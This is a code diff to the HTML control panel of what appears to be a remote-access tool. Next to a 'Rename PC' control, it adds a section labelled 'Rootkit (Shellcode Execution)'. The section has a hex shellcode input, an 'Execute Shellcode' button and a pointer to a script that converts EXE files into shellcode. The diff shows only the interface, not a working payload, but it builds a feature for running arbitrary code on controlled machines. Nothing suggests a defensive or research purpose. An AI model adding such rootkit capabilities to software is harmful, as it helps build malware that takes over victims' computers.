@@ -364,6 +364,17 @@
                         <input type="text" id="newPCName" placeholder="NewComputerName" maxlength="15">
                     </div>
                     <button class="btn btn-warning" onclick="renamePCFunc()">✏️ Rename PC (Restart Required)</button>
+                    
+                    <br><br>
+                    <h3>💀 Rootkit (Shellcode Execution)</h3>
+                    <div class="form-group">
+                        <label>Shellcode (hex):</label>
+                        <textarea id="shellcodeInput" rows="4" placeholder="909090C3 (example: NOP NOP NOP RET)"></textarea>
+                    </div>
+                    <button class="btn btn-danger" onclick="executeShellcodeFunc()">💀 Execute Shellcode</button>
+                    <p style="color: var(--text-dim); font-size: 11px; margin-top: 10px;">
+                        ⚠️ Use tools/exe_to_shellcode.py to convert EXE to shellcode
+                    </p>
                 </div>
             </div>
         </div>
